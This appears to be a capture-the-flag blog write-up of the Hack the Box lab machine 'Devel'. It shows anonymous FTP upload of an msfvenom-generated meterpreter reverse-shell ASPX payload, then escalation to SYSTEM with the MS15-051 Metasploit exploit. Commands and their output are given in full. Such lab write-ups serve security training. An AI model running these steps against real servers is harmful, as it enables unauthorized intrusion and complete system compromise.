---
layout: post
title: Hack the Box - Devel
date: 2020-06-23 19:06:22 +0100
description: Devel, while relatively simple, demonstrates the security risks associated with some defaultp rogram configurations. It is a beginner-level machine which can be completed using publicly available exploits.
img: devel.png
fig-caption: Devel
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/devel]
└─$ sudo nmap -p- -T4 10.129.113.247
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 19:37 GMT
Nmap scan report for 10.129.113.247
Host is up (0.016s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```
When accessing port 80 in a browser the default IIS page is visible and when connecting to the ftp server that is exposed as shown below you can see the same default page listed on the server. From there it is safe to assume that you have access to the same location and that we could upload a reverse webshell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/devel]
└─$ ftp 10.129.113.247
Connected to 10.129.113.247.
220 Microsoft FTP Service
Name (10.129.113.247:calxus): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

## Foothold
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/devel]
└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=4455 -f aspx > reverse.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2839 bytes
```
After generating the payload, we can put that in place on the ftp server and access it in a browser. Once we've done that, as long as we have a metasploit listener on the same port we should receive a shell.
```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4455 
[*] Sending stage (175174 bytes) to 10.129.113.247
[*] Meterpreter session 1 opened (10.10.14.27:4455 -> 10.129.113.247:49157) at 2021-03-15 19:55:35 +0000

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

## Privilege Escalation
Once we received the shell, we can escalate by searching for the exploit using the local_exploit_suggester. Then running as below.
```
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.27:7894 
[*] Launching notepad to host the exploit...
[+] Process 1692 launched.
[*] Reflectively injecting the exploit DLL into 1692...
[*] Injecting exploit into 1692...
[*] Exploit injected. Injecting payload into 1692...
[*] Payload injected. Executing exploit...
[*] Sending stage (175174 bytes) to 10.129.113.247
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.27:7894 -> 10.129.113.247:49158) at 2021-03-15 20:04:29 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```